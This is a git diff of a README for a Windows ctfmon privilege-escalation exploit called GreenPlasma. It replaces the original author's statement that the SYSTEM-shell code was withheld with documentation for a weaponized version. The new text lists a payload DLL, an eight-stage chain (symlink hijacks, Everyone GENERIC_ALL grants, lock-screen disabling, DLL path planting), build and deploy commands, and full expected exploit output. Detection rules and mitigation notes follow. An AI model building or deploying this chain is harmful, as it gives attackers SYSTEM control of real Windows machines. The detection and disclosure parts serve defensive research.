@@ -1,10 +1,153 @@
 # GreenPlasma
-GreenPlasma Windows CTFMON Arbitrary Section Creation Elevation of Privileges Vulnerability
 
-For this one, I'm not dropping the full PoC, I stripped off the necessary code for a full SYSTEM shell. This is a huge challenge for CTF lovers out there.
+**CTFMON Arbitrary Section Creation Elevation of Privileges Vulnerability**
 
-The PoC will create an arbitrary memory section object in any directory object write-able by SYSTEM, if you're smart enough, you can turn this into a full privilege escalation as you can influence the newly created section to manipulate data, lots of services (and even kernel mode drivers) blindly trust certain paths since a standard user is normally not supposed to have write access to them.
+Windows 11 / Server 2022 / Server 2026
 
-Unsure if this works in Windows 10 but it works in Windows 11/2022/2026 for sure.
+---
 
-<img width="1115" height="628" alt="obj" src="https://github.com/user-attachments/assets/3a843a4b-8daf-4fc9-9d95-26f87b67031b" />
+## Vulnerability Summary
+
+GreenPlasma exploits a logic bug in `ctfmon.exe` (Windows Text Services Framework). A standard user can create an NT Object Manager symbolic link at the path where ctfmon creates its `CTF.AsmListCache` section object. When ctfmon restarts in an elevated (SYSTEM) context, it follows the symlink and creates the section at an attacker-controlled path with SYSTEM-level trust.
+
+Combined with a registry symlink hijack (`CloudFiles\BlockedApps` → `Policies\System`) and DACL relaxation, this achieves **full local privilege escalation from standard user to SYSTEM** — no user interaction required.
+
+## Repository Contents
+
+| File | Description |
+|------|-------------|
+| `PoC.cpp` | Enhanced, fully commented exploit (7 stages + weaponization) |
+| `payload.cpp` | SYSTEM shell DLL/EXE (3 techniques: token dup, named pipe, service) |
+| `GreenPlasma.cpp` | Original source (stripped weaponization, as released by author) |
+| `ANALYSIS.md` | Stage-by-stage technical breakdown + 4 weaponization paths |
+| `MITIGATION.md` | Hardening recommendations + MSRC submission checklist |
+| `detection/sigma-greenplasma.yml` | 3 Sigma detection rules |
+
+## Exploit Chain
+
+```
+Standard User → Object Manager Symlink → Trigger ctfmon (SYSTEM) → 
+Registry Symlink Hijack → DACL Relaxation → DisableLockWorkstation → 
+Map SYSTEM Section → Write Payload → SYSTEM Shell
+```
+
+### Stage Breakdown
+
+1. **Object Manager Symlink** — Redirect `CTF.AsmListCache.FMPWinlogon{SID}` to attacker-controlled target
+2. **Ctfmon Elevation Trigger** — `CfAbortOperation` forces ctfmon restart as SYSTEM
+3. **Wait for SYSTEM Section** — Poll until ctfmon creates the section at our symlink target
+4. **Registry Symlink Hijack** — `CloudFiles\BlockedApps` → `Policies\System`
+5. **DACL Relaxation** — Grant `Everyone: GENERIC_ALL` on hijacked registry keys
+6. **DisableLockWorkstation** — Prevent lock screen via hijacked policy
+7. **Map SYSTEM Section** — `NtMapViewOfSection` into attacker process (read/write)
+8. **Weaponize** — Plant DLL path into section data → SYSTEM service loads payload
+
+## Build & Run
+
+### Prerequisites
+- Windows 11 / Server 2022 / Server 2026
+- Visual Studio (MSVC) with Windows SDK
+- Standard user account (not Session 0)
+
+### Build
+
+```batch
+:: Build the main exploit
+cl /EHsc /std:c++17 PoC.cpp /link ntdll.lib advapi32.lib
+
+:: Build the payload DLL (for section hijack weaponization)
+cl /EHsc /LD /Fe:greenplasma_payload.dll payload.cpp /link advapi32.lib shell32.lib
+
+:: OR build payload as standalone EXE (for independent testing)
+cl /EHsc /DSTANDALONE_EXE /Fe:greenplasma_payload.exe payload.cpp /link advapi32.lib shell32.lib
+```
+
+### Deploy
+
+```batch
+:: 1. Copy payload DLL to target path (matches path in PoC.cpp Stage 7)
+copy greenplasma_payload.dll C:\Temp\greenplasma_payload.dll
+
+:: 2. Run the exploit (standard user, interactive session)
+PoC.exe
+
+:: 3. Or with custom section target
+PoC.exe \BaseNamedObjects\MyCustomTarget
+```
+
+### Expected Output
+
+```
+  =========================================================
+  | GreenPlasma PoC - CTFMON Arbitrary Section Creation EoP |
+  | For responsible disclosure / cyber exercise use only   |
+  =========================================================
+
+[*] Running in Session 2
+[*] Section target: \BaseNamedObjects\CTFMON_DEAD
+
+[Stage 1] Creating Object Manager symlink:
+  Source: \Sessions\2\BaseNamedObjects\CTF.AsmListCache.FMPWinlogon2
+  Target: \BaseNamedObjects\CTFMON_DEAD
+  [OK] Symlink created successfully.
+
+[Stage 2] Triggering ctfmon elevation via CfAbortOperation...
+  [OK] CfAbortOperation called (trigger 1).
+  [OK] Conhost launched (elevation trigger).
+
+[Stage 3] Waiting for SYSTEM section creation...
+  [OK] Section handle acquired: 0x00000ABC
+
+[Stage 4] Creating registry symlink hijack...
+  [OK] CloudFiles DACL relaxed (Everyone: GENERIC_ALL).
+  [OK] Registry symlink created.
+  [OK] Policies\System DACL relaxed (Everyone: GENERIC_ALL).
+
+[Stage 5] Setting DisableLockWorkstation policy...
+  [OK] DisableLockWorkstation = 1 set successfully.
+
+[Stage 6] Mapping SYSTEM section into current process...
+  [OK] Section mapped READ-WRITE at 0x00007FFF12340000 (size: 4096 bytes)
+
+[Stage 7] WEAPONIZATION: Writing payload to SYSTEM section...
+  [WEAPONIZE] Writing DLL path payload into section...
+  [OK] DLL path written: C:\Temp\greenplasma_payload.dll
+
+[*] Press any key to close section and clean up.
+```
+
+## Detection
+
+See `detection/sigma-greenplasma.yml` for 3 Sigma rules:
+
+| Rule | What it Detects |
+|------|----------------|
+| GreenPlasma Registry Symlink | `CloudFiles\BlockedApps\SymbolicLinkValue` modification |
+| GreenPlasma Policy Hijack | `DisableLockWorkstation = 1` in HKCU Policies\System |
+| GreenPlasma Object Symlink | `CTF.AsmListCache` symlink in Object Manager namespace |
+
+Key indicators:
+- `NtCreateSymbolicLinkObject` targeting `CTF.AsmListCache` paths
+- `TreeSetNamedSecurityInfo` granting `Everyone: GENERIC_ALL` on CloudFiles or Policies keys
+- `REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE` on `CloudFiles\BlockedApps`
+- `DisableLockWorkstation = 1` in user policy (unusual in enterprise)
+
+## Mitigation
+
+See `MITIGATION.md` for full hardening recommendations including:
+- Registry key DACL restrictions
+- Object Manager namespace isolation
+- Sysmon detection configuration
+- Pre-patch workarounds
+
+**Root Cause:** `ctfmon.exe` does not validate symbolic links before creating section objects. **Fix:** Add symlink checks in ctfmon's section creation path.
+
+## Responsible Disclosure
+
+This repository is for **security research, cyber exercises, and responsible disclosure** only. A report is being prepared for Microsoft MSRC.
+
+**Do not use this exploit on systems you do not own or have authorization to test.**
+
+## License
+
+See [LICENSE](LICENSE) for the original repository license terms. All additions (PoC, payload, analysis, detection rules, mitigations) are provided for security research purposes.
